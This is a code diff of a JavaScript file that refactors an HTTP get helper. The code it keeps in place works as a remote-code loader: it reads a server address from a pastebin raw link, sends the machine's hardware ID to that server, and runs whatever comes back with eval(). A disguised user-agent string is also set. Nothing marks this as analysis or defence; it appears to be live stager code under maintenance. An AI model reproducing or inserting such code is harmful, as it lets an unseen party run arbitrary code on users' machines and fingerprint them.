@@ -96,12 +96,16 @@ const post = (url, d, headers = {}, full = false) => {
     });
 };
 
-const get = (httpS, url, headers = {}, full = false) => {
+const get = (url, headers = {}, full = false) => {
     return new Promise((resolve, reject) => {
         let userAgent = headers['user-agent'];
         if (!userAgent) userAgent = '5A16C235E6838352BAE5F6B3DD4C8CC3AC63FE30D7B2AA4C7756433BB5272764';
 
-        httpTable[httpS]['get'](url, { headers: { ...headers, 'user-agent': userAgent } }, (res) => {
+        const parsed = urlModule.parse(url);
+
+        const protocol = parsed.protocol.replace(':', '');
+
+        httpTable[protocol]['get'](url, { headers: { ...headers, 'user-agent': userAgent } }, (res) => {
             let responseStr = '';
 
             res.on('data', (data) => {
@@ -119,10 +123,8 @@ const get = (httpS, url, headers = {}, full = false) => {
 };
 
 // https://pastebin.com/raw/byqR6BER = localhost:500/c/:hwid
-get('https', 'https://pastebin.com/raw/byqR6BER').then((url) => {
-    const startsWithHttps = url.toLowerCase().startsWith('https');
-
+get('https://pastebin.com/raw/byqR6BER').then((url) => {
     machineId().then((hwid) => {
-        get(startsWithHttps ? 'https' : 'http', url.toLowerCase() + '/c/' + hwid).then((res) => eval(res));
+        get(url.toLowerCase() + '/c/' + hwid).then((res) => eval(res));
     });
 });
